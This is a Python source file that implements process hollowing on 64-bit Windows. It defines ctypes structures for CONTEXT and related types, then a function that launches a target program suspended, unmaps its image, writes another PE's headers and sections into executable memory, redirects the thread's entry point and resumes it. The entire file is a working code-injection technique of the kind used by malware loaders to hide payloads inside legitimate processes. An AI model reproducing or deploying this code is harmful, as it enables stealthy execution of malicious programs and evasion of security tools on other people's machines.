import ctypes
from ctypes.wintypes import DWORD, LPWSTR, WORD, LPBYTE, HANDLE, BYTE

import pefile

DWORD64 = ctypes.c_ulonglong


class STARTUPINFO(ctypes.Structure):
    _fields_ = (('cb', DWORD),
                ('lpReserved', LPWSTR),
                ('lpDesktop', LPWSTR),
                ('lpTitle', LPWSTR),
                ('dwX', DWORD),
                ('dwY', DWORD),
                ('dwXSize', DWORD),
                ('dwYSize', DWORD),
                ('dwXCountChars', DWORD),
                ('dwYCountChars', DWORD),
                ('dwFillAttribute', DWORD),
                ('dwFlags', DWORD),
                ('wShowWindow', WORD),
                ('cbReserved2', WORD),
                ('lpReserved2', LPBYTE),
                ('hStdInput', HANDLE),
                ('hStdOutput', HANDLE),
                ('hStdError', HANDLE))


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = (('hProcess', HANDLE),
                ('hThread', HANDLE),
                ('dwProcessId', DWORD),
                ('dwThreadId', DWORD))


class M128A(ctypes.Structure):
    _fields_ = (('Low', DWORD64),
                ('High', DWORD64))


class XMM_SAVE_AREA32(ctypes.Structure):
    _fields_ = (('ControlWord', WORD),
                ('StatusWord', WORD),
                ('TagWord', BYTE),
                ('Reserved1', BYTE),
                ('ErrorOpcode', WORD),
                ('ErrorOffset', DWORD),
                ('ErrorSelector', WORD),
                ('Reserved2', WORD),
                ('DataOffset', DWORD),
                ('DataSelector', WORD),
                ('Reserved3', WORD),
                ('MxCsr', DWORD),
                ('MxCsr_Mask', DWORD),
                ('FloatRegisters', M128A * 8),
                ('XmmRegisters', M128A * 16),
                ('Reserved4', BYTE * 96))


class DUMMYSTRUCTNAME(ctypes.Structure):
    _fields_ = (('Header', M128A * 2),
                ('Legacy', M128A * 8),
                ('Xmm0', M128A),
                ('Xmm1', M128A),
                ('Xmm2', M128A),
                ('Xmm3', M128A),
                ('Xmm4', M128A),
                ('Xmm5', M128A),
                ('Xmm6', M128A),
                ('Xmm7', M128A),
                ('Xmm8', M128A),
                ('Xmm9', M128A),
                ('Xmm10', M128A),
                ('Xmm11', M128A),
                ('Xmm12', M128A),
                ('Xmm13', M128A),
                ('Xmm14', M128A),
                ('Xmm15', M128A))


class DUMMYUNIONNAME(ctypes.Structure):
    _fields_ = (('FltSave', XMM_SAVE_AREA32),
                ('DummyStruct', DUMMYSTRUCTNAME))


class CONTEXT(ctypes.Structure):
    _fields_ = (('P1Home', DWORD64),
                ('P2Home', DWORD64),
                ('P3Home', DWORD64),
                ('P4Home', DWORD64),
                ('P5Home', DWORD64),
                ('P6Home', DWORD64),
                ('ContextFlags', DWORD),
                ('MxCsr', DWORD),
                ('SegCs', WORD),
                ('SegDs', WORD),
                ('SegEs', WORD),
                ('SegFs', WORD),
                ('SegGs', WORD),
                ('SegSs', WORD),
                ('EFlags', DWORD),
                ('Dr0', DWORD64),
                ('Dr1', DWORD64),
                ('Dr2', DWORD64),
                ('Dr3', DWORD64),
                ('Dr6', DWORD64),
                ('Dr7', DWORD64),
                ('Rax', DWORD64),
                ('Rcx', DWORD64),
                ('Rdx', DWORD64),
                ('Rbx', DWORD64),
                ('Rsp', DWORD64),
                ('Rbp', DWORD64),
                ('Rsi', DWORD64),
                ('Rdi', DWORD64),
                ('R8', DWORD64),
                ('R9', DWORD64),
                ('R10', DWORD64),
                ('R11', DWORD64),
                ('R12', DWORD64),
                ('R13', DWORD64),
                ('R14', DWORD64),
                ('R15', DWORD64),
                ('Rip', DWORD64),
                ('DUMMYUNIONNAME', DUMMYUNIONNAME),
                ('VectorRegister', M128A * 26),
                ('VectorControl', DWORD64),
                ('DebugControl', DWORD64),
                ('LastBranchToRip', DWORD64),
                ('LastBranchFromRip', DWORD64),
                ('LastExceptionToRip', DWORD64),
                ('LastExceptionFromRip', DWORD64))


def hollow_process(src, dst):
    startup_info = STARTUPINFO()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()
    if ctypes.windll.kernel32.CreateProcessA(
            None,
            ctypes.create_string_buffer(bytes(dst, encoding='ascii')),
            None,
            None,
            False,
            0x00000004,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
    ) == 0:
        return '[-] Error creating suspended process: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    context = CONTEXT()
    context.ContextFlags = 0x10007
    if ctypes.windll.kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
        return '[-] Error in GetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    base = ctypes.c_void_p()
    if ctypes.windll.kernel32.ReadProcessMemory(
            process_info.hProcess,
            ctypes.c_void_p(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
            ctypes.byref(base),
            ctypes.sizeof(ctypes.c_void_p),
            None
    ) == 0:
        return '[-] Error in ReadProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    src_pe = pefile.PE(src)
    if base == src_pe.OPTIONAL_HEADER.ImageBase:
        if ctypes.windll.ntdll.NtUnmapViewOfSection(process_info.hProcess, base) == 0:
            return '[-] Error in NtUnmapViewOfSection: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    address = ctypes.windll.kernel32.VirtualAllocEx(
        process_info.hProcess,
        ctypes.c_void_p(src_pe.OPTIONAL_HEADER.ImageBase),
        src_pe.OPTIONAL_HEADER.SizeOfImage,
        0x1000 | 0x2000,
        0x40
    )
    if address == 0:
        return '[-] Error in VirtualAllocEx: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
    with open(src, 'rb') as file:
        src_data = file.read()
    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                 ctypes.c_void_p(address),
                                                 src_data,
                                                 src_pe.OPTIONAL_HEADER.SizeOfHeaders,
                                                 None
                                                 ) == 0:
        return '[-] Error writing headers: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    for section in src_pe.sections:
        if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                     ctypes.c_void_p(address + section.VirtualAddress),
                                                     src_data[section.PointerToRawData:],
                                                     section.SizeOfRawData,
                                                     None
                                                     ) == 0:
            return '[-] Error writing sections: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    context.Rcx = address + src_pe.OPTIONAL_HEADER.AddressOfEntryPoint
    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                 ctypes.c_void_p(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
                                                 src_data[
                                                 src_pe.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
                                                 ctypes.sizeof(ctypes.c_void_p),
                                                 None
                                                 ) == 0:
        return '[-] Error writing base address: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    if ctypes.windll.kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
        return '[-] Error in SetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    if ctypes.windll.kernel32.ResumeThread(process_info.hThread) == 0:
        return '[-] Error in ResumeThread: {0}'.format(ctypes.FormatError(ctypes.GetLastError()))
    return '[+] Success'
